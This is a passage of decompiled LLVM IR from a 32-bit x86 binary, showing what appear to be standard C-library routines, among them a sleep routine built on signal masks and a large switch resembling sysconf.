  %v0_804eca7 = phi i32 [ 0, %dec_label_pc_804ec94 ], [ %v1_804eca7, %dec_label_pc_804eca4 ]
  %stack_var_-16.0 = phi i32 [ %v2_804ec9b, %dec_label_pc_804ec94 ], [ %v1_804eca8, %dec_label_pc_804eca4 ]
  %v1_804eca7 = add i32 %v0_804eca7, 1
  store i32 %v1_804eca7, i32* %esi.global-to-local, align 4
  %v1_804eca8 = add i32 %stack_var_-16.0, 4
  store i32 %v1_804eca8, i32* %eax.global-to-local, align 4
  %v1_804ecae = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_804ecae = load i32, i32* %v1_804ecae, align 4
  %v3_804ecae = icmp eq i32 %v2_804ecae, 0
  %v1_804ecb1 = icmp eq i1 %v3_804ecae, false
  br i1 %v1_804ecb1, label %dec_label_pc_804eca4, label %dec_label_pc_804ecb3

dec_label_pc_804ecb3:                             ; preds = %dec_label_pc_804eca4
  %v1_804ecb3 = mul i32 %v1_804eca7, 4
  %v2_804ecb3 = add i32 %v1_804ecb3, 34
  %v1_804ecba = and i32 %v2_804ecb3, -16
  %v2_804ecbd = sub i32 %v12_804ec9e, %v1_804ecba
  %v1_804ecc2 = add i32 %v2_804ecbd, 15
  %v1_804ecc6 = and i32 %v1_804ecc2, -16
  store i32 %v1_804ecc6, i32* @ebx, align 4
  store i32 %v1_804ecc6, i32* %ecx.global-to-local, align 4
  %v2_804eccb = inttoptr i32 %v1_804ecc6 to i32*
  store i32 %arg2, i32* %v2_804eccb, align 16
  store i32 %v2_804ec9b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ecd3

dec_label_pc_804ecd3:                             ; preds = %dec_label_pc_804ecd3, %dec_label_pc_804ecb3
  %stack_var_-16.1 = phi i32 [ %v2_804ec9b, %dec_label_pc_804ecb3 ], [ %v1_804ecda, %dec_label_pc_804ecd3 ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_804ecd6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ecd6 = add i32 %v0_804ecd6, 4
  store i32 %v1_804ecd6, i32* %ecx.global-to-local, align 4
  %v0_804ecd9 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ecd9 = add i32 %v0_804ecd9, -1
  %v8_804ecd9 = icmp eq i32 %v1_804ecd9, 0
  store i32 %v1_804ecd9, i32* %esi.global-to-local, align 4
  %v1_804ecda = add i32 %stack_var_-16.1, 4
  %v1_804ece0 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_804ece0 = load i32, i32* %v1_804ece0, align 4
  store i32 %v2_804ece0, i32* %eax.global-to-local, align 4
  %v2_804ece2 = inttoptr i32 %v1_804ecd6 to i32*
  store i32 %v2_804ece0, i32* %v2_804ece2, align 4
  %v1_804ece4 = icmp eq i1 %v8_804ecd9, false
  br i1 %v1_804ece4, label %dec_label_pc_804ecd3, label %dec_label_pc_804ece6

dec_label_pc_804ece6:                             ; preds = %dec_label_pc_804ecd3
  %v0_804ece6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ece6 = load i32, i32* @esp, align 4
  %v2_804ece6 = add i32 %v1_804ece6, -4
  %v3_804ece6 = inttoptr i32 %v2_804ece6 to i32*
  store i32 %v0_804ece6, i32* %v3_804ece6, align 4
  %v0_804ece7 = load i32, i32* @global_var_805846c.171, align 4
  %v2_804ece7 = add i32 %v1_804ece6, -8
  %v3_804ece7 = inttoptr i32 %v2_804ece7 to i32*
  store i32 %v0_804ece7, i32* %v3_804ece7, align 4
  %v0_804eced = load i32, i32* @ebx, align 4
  %v2_804eced = add i32 %v1_804ece6, -12
  %v3_804eced = inttoptr i32 %v2_804eced to i32*
  store i32 %v0_804eced, i32* %v3_804eced, align 4
  %v5_804ecee = add i32 %v1_804ece6, -16
  %v6_804ecee = inttoptr i32 %v5_804ecee to i32*
  store i32 %arg1, i32* %v6_804ecee, align 4
  %v1_804ecf1 = inttoptr i32 %v1_804ecda to i8*
  %v2_804ecf1 = call i32 @function_804f500(i8* %v1_804ecf1)
  store i32 %v2_804ecf1, i32* %eax.global-to-local, align 4
  %v2_804ecf9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ecf9, i32* @ebx, align 4
  ret i32 %v2_804ecf1

; uselistorder directives
  uselistorder i32 %v1_804ecd9, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_804eca8, { 1, 0 }
  uselistorder i32 %v1_804eca7, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_804ec9b, { 0, 2, 1, 3 }
}

define i32 @function_804ed00(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ed00:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_804ed00 = load i32, i32* @ebp, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  %v0_804ed06 = load i32, i32* @edi, align 4
  %v0_804ed07 = load i32, i32* @esi, align 4
  %v0_804ed08 = load i32, i32* @ebx, align 4
  %v15_804ed09 = ptrtoint i32* %stack_var_-444 to i32
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_804ed16 = icmp eq i32 %arg1, 0
  %v1_804ed18 = icmp eq i1 %v1_804ed16, false
  br i1 %v1_804ed18, label %dec_label_pc_804ed2a.preheader, label %dec_label_pc_804ee77

dec_label_pc_804ed2a.preheader:                   ; preds = %dec_label_pc_804ed00
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed1f

dec_label_pc_804ed1f:                             ; preds = %dec_label_pc_804ed1f.dec_label_pc_804ed1f_crit_edge, %dec_label_pc_804ed2a.preheader
  %v0_804ed1f = phi i32 [ %v15_804ed09, %dec_label_pc_804ed2a.preheader ], [ %v0_804ed1f.pre, %dec_label_pc_804ed1f.dec_label_pc_804ed1f_crit_edge ]
  %v1_804ed2a29 = phi i32 [ 31, %dec_label_pc_804ed2a.preheader ], [ %v1_804ed2a, %dec_label_pc_804ed1f.dec_label_pc_804ed1f_crit_edge ]
  %v2_804ed1f = mul i32 %v1_804ed2a29, 4
  %v3_804ed1f = add i32 %v2_804ed1f, 292
  %v4_804ed1f = add i32 %v3_804ed1f, %v0_804ed1f
  %v5_804ed1f = inttoptr i32 %v4_804ed1f to i32*
  store i32 0, i32* %v5_804ed1f, align 4
  %v0_804ed2a.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed2a = add i32 %v0_804ed2a.pre, -1
  %v9_804ed2a = icmp slt i32 %v1_804ed2a, 0
  store i32 %v1_804ed2a, i32* %eax.global-to-local, align 4
  %v1_804ed2b = icmp eq i1 %v9_804ed2a, false
  br i1 %v1_804ed2b, label %dec_label_pc_804ed1f.dec_label_pc_804ed1f_crit_edge, label %dec_label_pc_804ed2d

dec_label_pc_804ed1f.dec_label_pc_804ed1f_crit_edge: ; preds = %dec_label_pc_804ed1f
  %v0_804ed1f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ed1f

dec_label_pc_804ed2d:                             ; preds = %dec_label_pc_804ed1f
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804ed43 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804ed43, i32* @ebx, align 4
  store i32 %v2_804ed43, i32* %stack_var_-460, align 4
  %v4_804ed4b = call i32 @function_8050fc4(i32 %v2_804ed43, i32 17, i32 %v1_804ed2a, i32 %v1_804ed2a)
  store i32 %v4_804ed4b, i32* %eax.global-to-local, align 4
  %v2_804ed53 = icmp slt i32 %v4_804ed4b, 0
  br i1 %v2_804ed53, label %dec_label_pc_804ee7b, label %dec_label_pc_804ed5b

dec_label_pc_804ed5b:                             ; preds = %dec_label_pc_804ed2d
  %v2_804ed5c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_804ed5c, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_804ed67 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_804ed67 = call i32 @function_804f794(i32 0, %_TYPEDEF_sigset_t* %v3_804ed67, i32 %v2_804ed5c)
  store i32 %v4_804ed67, i32* %eax.global-to-local, align 4
  %v1_804ed6f = icmp eq i32 %v4_804ed67, 0
  %v1_804ed71 = icmp eq i1 %v1_804ed6f, false
  br i1 %v1_804ed71, label %dec_label_pc_804ee7b, label %dec_label_pc_804ed77

dec_label_pc_804ed77:                             ; preds = %dec_label_pc_804ed5b
  store i32 %v2_804ed5c, i32* %stack_var_-460, align 4
  %v4_804ed7c = call i32 @function_8050fa0(i32 %v2_804ed5c, i32 17, i32 %v4_804ed67, i32 %v4_804ed67)
  store i32 %v4_804ed7c, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_804ed89 = icmp eq i32 %v4_804ed7c, 0
  br i1 %v1_804ed89, label %dec_label_pc_804ed9d.preheader, label %dec_label_pc_804ee45

dec_label_pc_804ed9d.preheader:                   ; preds = %dec_label_pc_804ed77
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ed92

dec_label_pc_804ed92:                             ; preds = %dec_label_pc_804ed92.dec_label_pc_804ed92_crit_edge, %dec_label_pc_804ed9d.preheader
  %v0_804ed92 = phi i32 [ %v15_804ed09, %dec_label_pc_804ed9d.preheader ], [ %v0_804ed92.pre, %dec_label_pc_804ed92.dec_label_pc_804ed92_crit_edge ]
  %v1_804ed9d28 = phi i32 [ 31, %dec_label_pc_804ed9d.preheader ], [ %v1_804ed9d, %dec_label_pc_804ed92.dec_label_pc_804ed92_crit_edge ]
  %v2_804ed92 = mul i32 %v1_804ed9d28, 4
  %v3_804ed92 = add i32 %v2_804ed92, 292
  %v4_804ed92 = add i32 %v3_804ed92, %v0_804ed92
  %v5_804ed92 = inttoptr i32 %v4_804ed92 to i32*
  store i32 0, i32* %v5_804ed92, align 4
  %v0_804ed9d.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_804ed9d = add i32 %v0_804ed9d.pre, -1
  %v9_804ed9d = icmp slt i32 %v1_804ed9d, 0
  store i32 %v1_804ed9d, i32* %edx.global-to-local, align 4
  %v1_804ed9e = icmp eq i1 %v9_804ed9d, false
  br i1 %v1_804ed9e, label %dec_label_pc_804ed92.dec_label_pc_804ed92_crit_edge, label %dec_label_pc_804eda0

dec_label_pc_804ed92.dec_label_pc_804ed92_crit_edge: ; preds = %dec_label_pc_804ed92
  %v0_804ed92.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ed92

dec_label_pc_804eda0:                             ; preds = %dec_label_pc_804ed92
  store i32 %v2_804ed43, i32* %eax.global-to-local, align 4
  store i32 %v2_804ed43, i32* %stack_var_-460, align 4
  %v4_804edac = call i32 @function_8050fc4(i32 %v2_804ed43, i32 17, i32 0, i32 0)
  store i32 %v4_804edac, i32* %eax.global-to-local, align 4
  %v2_804edb4 = icmp slt i32 %v4_804edac, 0
  br i1 %v2_804edb4, label %dec_label_pc_804ee7b, label %dec_label_pc_804edbc

dec_label_pc_804edbc:                             ; preds = %dec_label_pc_804eda0
  %v2_804edbd = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_804edbd, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v5_804edc6 = call i32 @function_804f257(i32 17, i32* null, i32 %v2_804edbd, i32 %v4_804edac)
  store i32 %v5_804edc6, i32* %eax.global-to-local, align 4
  %v2_804edce = icmp slt i32 %v5_804edc6, 0
  %v1_804edd0 = icmp eq i1 %v2_804edce, false
  br i1 %v1_804edd0, label %dec_label_pc_804edfa, label %dec_label_pc_804edd2

dec_label_pc_804edd2:                             ; preds = %dec_label_pc_804edbc
  %v0_804edd2 = load i32, i32* %stack_var_-460, align 4
  %v1_804edd2 = call i32 @function_804b7f4(i32 %v0_804edd2)
  store i32 %v1_804edd2, i32* %eax.global-to-local, align 4
  %v1_804edd7 = inttoptr i32 %v1_804edd2 to i32*
  %v2_804edd7 = load i32, i32* %v1_804edd7, align 4
  store i32 %v2_804edd7, i32* @esi, align 4
  store i32 %v1_804edd2, i32* @ebx, align 4
  store i32 %v2_804ed5c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804ede8 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804ede8 = call i32 @function_804f794(i32 2, %_TYPEDEF_sigset_t* %v3_804ede8, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_804edf3 = load i32, i32* @esi, align 4
  %v1_804edf3 = load i32, i32* @ebx, align 4
  %v2_804edf3 = inttoptr i32 %v1_804edf3 to i32*
  store i32 %v0_804edf3, i32* %v2_804edf3, align 4
  %v0_804ee88.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ee7e

dec_label_pc_804edfa:                             ; preds = %dec_label_pc_804edbc
  %v3_804edfa = load i32, i32* %stack_var_-420, align 4
  %v12_804edfa = icmp eq i32 %v3_804edfa, 1
  %v2_804ee06 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804ee06, i32* @ebx, align 4
  %v1_804ee0d = icmp eq i1 %v12_804edfa, false
  br i1 %v1_804ee0d, label %dec_label_pc_804ee34, label %dec_label_pc_804ee0f

dec_label_pc_804ee0f:                             ; preds = %dec_label_pc_804edfa
  %v0_804ee0f = load i32, i32* @edi, align 4
  store i32 %v2_804ee06, i32* %stack_var_-460, align 4
  %v4_804ee13 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_804ee13 = call i32 @function_804f67c(%timespec* %v4_804ee13, i32 %v2_804ee06, i32 %v0_804ee0f, i32 %v0_804ee0f)
  store i32 %v5_804ee13, i32* %eax.global-to-local, align 4
  store i32 %v5_804ee13, i32* @edi, align 4
  %v1_804ee1a = call i32 @function_804b7f4(i32 %v2_804ee06)
  store i32 %v1_804ee1a, i32* %eax.global-to-local, align 4
  %v1_804ee22 = inttoptr i32 %v1_804ee1a to i32*
  %v2_804ee22 = load i32, i32* %v1_804ee22, align 4
  store i32 %v2_804ee22, i32* @esi, align 4
  store i32 %v1_804ee1a, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804ee2b = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804ee2b = call i32 @function_804f794(i32 2, %_TYPEDEF_sigset_t* %v3_804ee2b, i32 0)
  store i32 %v4_804ee2b, i32* %eax.global-to-local, align 4
  %v0_804ee30 = load i32, i32* @esi, align 4
  %v1_804ee30 = load i32, i32* @ebx, align 4
  %v2_804ee30 = inttoptr i32 %v1_804ee30 to i32*
  store i32 %v0_804ee30, i32* %v2_804ee30, align 4
  %v0_804ee5a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804ee57

dec_label_pc_804ee34:                             ; preds = %dec_label_pc_804edfa
  store i32 2, i32* %stack_var_-460, align 4
  %v3_804ee3a = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_804ee3a = call i32 @function_804f794(i32 2, %_TYPEDEF_sigset_t* %v3_804ee3a, i32 0)
  store i32 %v4_804ee3a, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ee50

dec_label_pc_804ee45:                             ; preds = %dec_label_pc_804ed77
  %v2_804ee47 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804ee47, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ee50

dec_label_pc_804ee50:                             ; preds = %dec_label_pc_804ee34, %dec_label_pc_804ee45
  %storemerge3.pre-phi = phi i32 [ %v2_804ee06, %dec_label_pc_804ee34 ], [ %v2_804ee47, %dec_label_pc_804ee45 ]
  %v3_804ee50 = phi i32 [ %v2_804ed5c, %dec_label_pc_804ee34 ], [ %v4_804ed7c, %dec_label_pc_804ee45 ]
  %v2_804ee50 = phi i32 [ 0, %dec_label_pc_804ee34 ], [ %v4_804ed7c, %dec_label_pc_804ee45 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_804ee50 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_804ee50 = call i32 @function_804f67c(%timespec* %v4_804ee50, i32 %storemerge3.pre-phi, i32 %v2_804ee50, i32 %v3_804ee50)
  store i32 %v5_804ee50, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ee57

dec_label_pc_804ee57:                             ; preds = %dec_label_pc_804ee0f, %dec_label_pc_804ee50
  %v0_804ee5a = phi i32 [ %v0_804ee5a.pre, %dec_label_pc_804ee0f ], [ %v5_804ee50, %dec_label_pc_804ee50 ]
  %v1_804ee5a = icmp eq i32 %v0_804ee5a, 0
  br i1 %v1_804ee5a, label %dec_label_pc_804ee77, label %dec_label_pc_804ee5e

dec_label_pc_804ee5e:                             ; preds = %dec_label_pc_804ee57
  %v4_804ee6e = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_804ee6e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ee7e

dec_label_pc_804ee77:                             ; preds = %dec_label_pc_804ed00, %dec_label_pc_804ee57
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ee7e

dec_label_pc_804ee7b:                             ; preds = %dec_label_pc_804eda0, %dec_label_pc_804ed5b, %dec_label_pc_804ed2d
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ee7e

dec_label_pc_804ee7e:                             ; preds = %dec_label_pc_804ee77, %dec_label_pc_804ee5e, %dec_label_pc_804edd2, %dec_label_pc_804ee7b
  %v0_804ee88 = phi i32 [ 0, %dec_label_pc_804ee77 ], [ %v4_804ee6e, %dec_label_pc_804ee5e ], [ %v0_804ee88.pre, %dec_label_pc_804edd2 ], [ -1, %dec_label_pc_804ee7b ]
  store i32 %v0_804ed08, i32* @ebx, align 4
  store i32 %v0_804ed07, i32* @esi, align 4
  store i32 %v0_804ed06, i32* @edi, align 4
  store i32 %v0_804ed00, i32* @ebp, align 4
  ret i32 %v0_804ee88

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804ee1a, { 1, 0, 2 }
  uselistorder i32 %v2_804ee06, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_804ed9d, { 2, 1, 0 }
  uselistorder i32 %v4_804ed7c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804ed5c, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_804ed43, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_804ed2a, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8050fc4, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ee7e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ee77, { 1, 0 }
  uselistorder label %dec_label_pc_804ee57, { 1, 0 }
  uselistorder label %dec_label_pc_804ee50, { 1, 0 }
}

define i32 @function_804ee8c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ee8c:
  switch i32 %arg1, label %dec_label_pc_804eeab [
    i32 0, label %dec_label_pc_804eebb
    i32 1, label %dec_label_pc_804efa0
    i32 2, label %dec_label_pc_804eec5
    i32 3, label %dec_label_pc_804eecf
    i32 4, label %dec_label_pc_804eed9
    i32 5, label %dec_label_pc_804ef6f
    i32 6, label %dec_label_pc_804eee1
    i32 7, label %dec_label_pc_804eea1
    i32 8, label %dec_label_pc_804eea1
    i32 9, label %dec_label_pc_804eea1
    i32 10, label %dec_label_pc_804eea1
    i32 11, label %dec_label_pc_804eea1
    i32 12, label %dec_label_pc_804eea1
    i32 13, label %dec_label_pc_804eea1
    i32 14, label %dec_label_pc_804eea1
    i32 15, label %dec_label_pc_804eea1
    i32 16, label %dec_label_pc_804eea1
    i32 17, label %dec_label_pc_804eea1
    i32 18, label %dec_label_pc_804eea1
    i32 19, label %dec_label_pc_804eea1
    i32 20, label %dec_label_pc_804eea1
    i32 21, label %dec_label_pc_804eea1
    i32 22, label %dec_label_pc_804eea1
    i32 23, label %dec_label_pc_804efa0
    i32 24, label %dec_label_pc_804efa0
    i32 25, label %dec_label_pc_804efac
    i32 26, label %dec_label_pc_804ef7d
    i32 27, label %dec_label_pc_804efa0
    i32 28, label %dec_label_pc_804eef3
    i32 29, label %dec_label_pc_804ef76
    i32 30, label %dec_label_pc_804eeeb
    i32 31, label %dec_label_pc_804ef8b
    i32 32, label %dec_label_pc_804efa0
    i32 33, label %dec_label_pc_804efa0
    i32 34, label %dec_label_pc_804efa0
    i32 35, label %dec_label_pc_804ef84
    i32 36, label %dec_label_pc_804efb3
    i32 37, label %dec_label_pc_804efba
    i32 38, label %dec_label_pc_804efb3
    i32 39, label %dec_label_pc_804eefd
    i32 40, label %dec_label_pc_804efc1
    i32 41, label %dec_label_pc_804efa0
    i32 42, label %dec_label_pc_804ef8b
    i32 43, label %dec_label_pc_804efba
    i32 44, label %dec_label_pc_804efc8
    i32 45, label %dec_label_pc_804efba
    i32 46, label %dec_label_pc_804ef76
    i32 47, label %dec_label_pc_804ef76
    i32 48, label %dec_label_pc_804ef76
    i32 49, label %dec_label_pc_804efa0
    i32 50, label %dec_label_pc_804efa0
    i32 51, label %dec_label_pc_804ef76
    i32 52, label %dec_label_pc_804ef76
    i32 53, label %dec_label_pc_804efa0
    i32 54, label %dec_label_pc_804efa0
    i32 55, label %dec_label_pc_804efa0
    i32 56, label %dec_label_pc_804efa0
    i32 57, label %dec_label_pc_804efa0
    i32 58, label %dec_label_pc_804efa0
    i32 59, label %dec_label_pc_804efa0
    i32 60, label %dec_label_pc_804efa0
    i32 61, label %dec_label_pc_804efa0
    i32 62, label %dec_label_pc_804efa0
    i32 63, label %dec_label_pc_804efa0
    i32 64, label %dec_label_pc_804efa0
    i32 65, label %dec_label_pc_804efa0
    i32 66, label %dec_label_pc_804efa0
    i32 67, label %dec_label_pc_804eea1
    i32 68, label %dec_label_pc_804eea1
    i32 69, label %dec_label_pc_804ef84
    i32 70, label %dec_label_pc_804ef84
    i32 71, label %dec_label_pc_804ef84
    i32 72, label %dec_label_pc_804ef8b
    i32 73, label %dec_label_pc_804ef92
    i32 74, label %dec_label_pc_804ef99
    i32 75, label %dec_label_pc_804ef07
    i32 76, label %dec_label_pc_804ef99
    i32 77, label %dec_label_pc_804eea1
    i32 78, label %dec_label_pc_804eea1
    i32 79, label %dec_label_pc_804eea1
    i32 80, label %dec_label_pc_804eea1
    i32 81, label %dec_label_pc_804eea1
    i32 82, label %dec_label_pc_804eea1
    i32 83, label %dec_label_pc_804eea1
    i32 84, label %dec_label_pc_804eea1
    i32 85, label %dec_label_pc_804efa0
    i32 86, label %dec_label_pc_804efa0
    i32 87, label %dec_label_pc_804ef7d
    i32 88, label %dec_label_pc_804ef11
    i32 89, label %dec_label_pc_804ef1b
    i32 90, label %dec_label_pc_804ef92
    i32 91, label %dec_label_pc_804eea1
    i32 92, label %dec_label_pc_804eea1
    i32 93, label %dec_label_pc_804eea1
    i32 94, label %dec_label_pc_804eea1
    i32 95, label %dec_label_pc_804ef76
    i32 96, label %dec_label_pc_804efa0
    i32 97, label %dec_label_pc_804efa0
    i32 98, label %dec_label_pc_804eea1
    i32 99, label %dec_label_pc_804eea1
    i32 100, label %dec_label_pc_804eea1
    i32 101, label %dec_label_pc_804ef25
    i32 102, label %dec_label_pc_804ef68
    i32 103, label %dec_label_pc_804efa5
    i32 104, label %dec_label_pc_804ef7d
    i32 105, label %dec_label_pc_804ef2f
    i32 106, label %dec_label_pc_804ef8b
    i32 107, label %dec_label_pc_804ef8b
    i32 108, label %dec_label_pc_804ef6f
    i32 109, label %dec_label_pc_804efac
    i32 110, label %dec_label_pc_804efc8
    i32 111, label %dec_label_pc_804ef68
    i32 112, label %dec_label_pc_804efa5
    i32 113, label %dec_label_pc_804efc8
    i32 114, label %dec_label_pc_804ef39
    i32 115, label %dec_label_pc_804efc1
    i32 116, label %dec_label_pc_804efa0
    i32 117, label %dec_label_pc_804efa0
    i32 118, label %dec_label_pc_804ef43
    i32 119, label %dec_label_pc_804ef4d
    i32 120, label %dec_label_pc_804efba
    i32 121, label %dec_label_pc_804ef7d
    i32 122, label %dec_label_pc_804ef7d
    i32 123, label %dec_label_pc_804ef7d
    i32 124, label %dec_label_pc_804ef7d
    i32 125, label %dec_label_pc_804eea1
    i32 126, label %dec_label_pc_804eea1
    i32 127, label %dec_label_pc_804efa0
    i32 128, label %dec_label_pc_804efa0
    i32 129, label %dec_label_pc_804eea1
    i32 130, label %dec_label_pc_804eea1
    i32 131, label %dec_label_pc_804efa0
    i32 149, label %dec_label_pc_804ef54
  ]

dec_label_pc_804eea1:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804eeab:                             ; preds = %dec_label_pc_804ee8c
  %v1_804eeab = call i32 @function_804b7f4(i32 ptrtoint (i32* @0 to i32))
  %v1_804eeb0 = inttoptr i32 %v1_804eeab to i32*
  store i32 22, i32* %v1_804eeb0, align 4
  br label %dec_label_pc_804efa0

dec_label_pc_804eebb:                             ; preds = %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804eec5:                             ; preds = %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804eecf:                             ; preds = %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804eed9:                             ; preds = %dec_label_pc_804ee8c
  %v0_804eedc = call i32 @function_804f538()
  br label %dec_label_pc_804eee1

dec_label_pc_804eee1:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804eed9
  br label %dec_label_pc_804efcd

dec_label_pc_804eeeb:                             ; preds = %dec_label_pc_804ee8c
  %v0_804eeee = call i32 @function_804f5d8()
  br label %dec_label_pc_804eef3

dec_label_pc_804eef3:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804eeeb
  br label %dec_label_pc_804efcd

dec_label_pc_804eefd:                             ; preds = %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef07:                             ; preds = %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef11:                             ; preds = %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef1b:                             ; preds = %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef25:                             ; preds = %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef2f:                             ; preds = %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef39:                             ; preds = %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef43:                             ; preds = %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef4d:                             ; preds = %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef54:                             ; preds = %dec_label_pc_804ee8c
  %v5_804ef5a = call i32 @function_804f498(i32 1, %timespec* null, i32 149, i32 149)
  %v2_804ef62 = icmp slt i32 %v5_804ef5a, 0
  %v1_804ef64 = icmp eq i1 %v2_804ef62, false
  br i1 %v1_804ef64, label %dec_label_pc_804ef76, label %dec_label_pc_804efa0

dec_label_pc_804ef68:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef6f:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c
  br label %dec_label_pc_804efcd

dec_label_pc_804ef76:                             ; preds = %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ee8c, %dec_label_pc_804ef54
  br label %dec_label_pc_804efcd

